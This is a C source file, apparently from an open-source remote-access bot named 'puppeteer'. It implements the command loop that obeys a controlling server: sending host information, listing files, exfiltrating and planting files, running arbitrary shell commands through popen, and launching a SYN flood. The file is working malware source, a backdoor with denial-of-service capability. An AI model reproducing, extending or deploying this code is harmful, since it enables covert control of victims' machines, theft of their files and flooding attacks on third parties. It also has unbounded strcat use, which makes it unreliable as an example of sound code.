// MIT License
/*
 * This header file belongs to https://github.com/arthur-bryan/puppeteer
 *
 * Functions based on received commands.
 *
 * Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
 */
#include "../include/commands.h"

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "../include/information.h"
#include "../include/list_files.h"
#include "../include/receive_file.h"
#include "../include/send_file.h"
#include "../include/run_shell_command.h"
#include "../include/syn_flood.h"


/*
 * Execute functions based on commands received from the server
 *
 * Parameters:
 *      int16_t socket_fd: the socket file descriptor
 */
void
start_communication(int16_t socket_fd, host_t host) {
    char    *command_buffer;
    char    *str_command;

    while (1) {
        command_buffer = calloc(COMMAND_BUFFER_SIZE, sizeof(char));
        // receives the command
        if (recv(socket_fd, command_buffer, COMMAND_BUFFER_SIZE, 0) < 1) {
            return;
        }
        // sets the original buffer size without losing its data
        command_buffer = realloc(command_buffer, COMMAND_BUFFER_SIZE);
        str_command = calloc(strlen(command_buffer) + 1, sizeof(char));
        // fills the str_command buffer
        for (size_t buffer_index = 0; buffer_index <= strlen(command_buffer);) {
            *(str_command + buffer_index) = command_buffer[buffer_index];
            buffer_index += 1;
        }
        if (strcmp(str_command, "exit") == 0) {
            close(socket_fd);
            free(command_buffer);
            free(str_command);
            exit(0);
        } else if (strcmp(str_command, "send info") == 0) {
            send_host_info(socket_fd, host);
        } else if (strcmp(str_command, "list files") == 0) {
            char *command_output = list_files(socket_fd);
            send(socket_fd, command_output, strlen(command_output) + 1, 0);
            free(command_output);
        } else if (strcmp(str_command, "upload") == 0) {
            send_file(socket_fd);
        } else if (strcmp(str_command, "download") == 0) {
            receive_file(socket_fd);
        } else if (strcmp(str_command, "remote cmd") == 0) {
            run_shell_command(socket_fd);
        } else if (strcmp(str_command, "syn flood") == 0) {
            syn_flood(socket_fd);
        }
        free(str_command);
        free(command_buffer);
    }
}

/*
 * Executes the command and return its output
 *
 * Parameters:
 *      const char *command: the command string to be executed
 * Returns:
 *      char *output_buffer: a pointer to string containing the command output
 */
char
*execute_cmd(const char *command) {
    char    *output_buffer;
    FILE    *command_output;

    output_buffer = calloc(OUTPUT_BUFFER_SIZE, sizeof(char));
    command_output = popen(command, "r");
    if (command_output != NULL) {
        char bytes_read[OUTPUT_BUFFER_SIZE];

        while (fgets(bytes_read, sizeof bytes_read, command_output) != NULL) {
            strcat(output_buffer, bytes_read);
        }
        pclose(command_output);
    }
    return output_buffer;
}
